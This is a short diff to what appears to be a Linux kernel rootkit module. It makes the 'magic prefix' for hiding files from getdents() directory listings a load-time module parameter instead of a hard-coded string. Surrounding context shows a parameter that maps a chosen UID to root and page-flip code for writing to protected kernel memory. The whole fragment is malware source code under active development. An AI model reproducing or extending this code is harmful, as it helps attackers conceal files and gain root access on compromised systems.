@@ -44,11 +44,9 @@ MODULE_PARM_DESC(root_uid, "UID to map to root");
  * Files that start with a prefix matching magic_prefix are removed from the
  * linux_dirent64* buffer that is returned to the caller of getdents()
  */
-static char* magic_prefix = "foo";
-// TODO Pass this in dynamically, using below
-// Below currently doesn't work because it triggers a compiler error
-//module_param(magic_prefix, charp, "$sys$");
-//MODULE_PARM_DESC(magic_prefix, "Magic prefix for hiding files with getdents()");
+static char* magic_prefix;
+module_param(magic_prefix, charp, 0);
+MODULE_PARM_DESC(magic_prefix, "Magic prefix for hiding files with getdents()");
 
 /*
  * RW/RO page flip code borrowed from Cormander's TPE-LKM code.
